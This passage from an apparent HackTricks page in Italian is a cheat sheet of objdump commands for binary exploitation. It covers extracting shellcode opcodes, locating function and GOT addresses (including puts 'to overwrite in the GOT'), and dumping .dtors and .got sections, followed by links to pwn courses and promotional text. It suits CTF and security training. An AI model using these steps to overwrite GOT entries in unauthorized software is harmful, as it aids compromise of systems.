**objdump -d eseguibile** ‚Äî> Disas functions\
**objdump -d ./PROGRAMA | grep FUNZIONE** ‚Äî> Ottieni indirizzo funzione\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Per vedere che effettivamente √® la nostra shellcode e estrarre gli OpCodes\
**objdump -t ./exec | grep varBss** ‚Äî> Tabella dei simboli, per estrarre indirizzi di variabili e funzioni\
**objdump -TR ./exec | grep exit(func lib)** ‚Äî> Per estrarre indirizzi di funzioni di librerie (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** ‚Äî> Estrae l'indirizzo di puts da sovrascrivere nella GOT\
**objdump -D ./exec** ‚Äî> Disas ALL fino alle entrate della plt\
**objdump -p -/exec**\
**Info functions strncmp ‚Äî>** Info della funzione in gdb

## Corsi interessanti

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Riferimenti**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

{% hint style="success" %}
Impara e pratica AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.

</details>
{% endhint %}
